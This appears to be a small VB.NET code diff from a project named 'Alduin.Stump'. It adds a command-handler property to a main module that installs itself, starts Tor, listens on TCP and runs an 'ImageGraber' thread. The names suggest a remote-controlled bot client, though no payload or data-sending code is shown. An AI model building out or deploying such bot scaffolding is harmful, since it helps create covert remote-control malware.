@@ -1,5 +1,6 @@
 ﻿Imports System.IO
 Imports System.Threading
+Imports Alduin.Stump.Alduin.Stump.Class.Commands
 Imports Alduin.Stump.Alduin.Stump.Class.Network
 Imports Newtonsoft.Json
 
@@ -8,6 +9,7 @@ Module Main
     ReadOnly NewNotice As New Thread(AddressOf Noticer)
     ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
     ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
+    Private _command As New CommandHandler
     Private _config As New ConfigBotModel
     Public Property Config As ConfigBotModel
         Get
@@ -18,11 +20,19 @@ Module Main
         End Set
     End Property
 
+    Public Property Command As CommandHandler
+        Get
+            Return _command
+        End Get
+        Set(value As CommandHandler)
+            _command = value
+        End Set
+    End Property
+
     Sub Main()
         configBot()
         Install()
         StartTor()
-
         NewListener.Start()
         NewNotice.Start()
         DelayedAction.Start()
@@ -34,7 +44,7 @@ Module Main
         If Config.Variables.Debug Then
             Console.WriteLine("Listening") 'Debugging
         End If
-        Dim tcplistener As New TcpListen
+        Dim tcplistener As New TcpListen()
         While (True)
             tcplistener.TcpAsync()
         End While
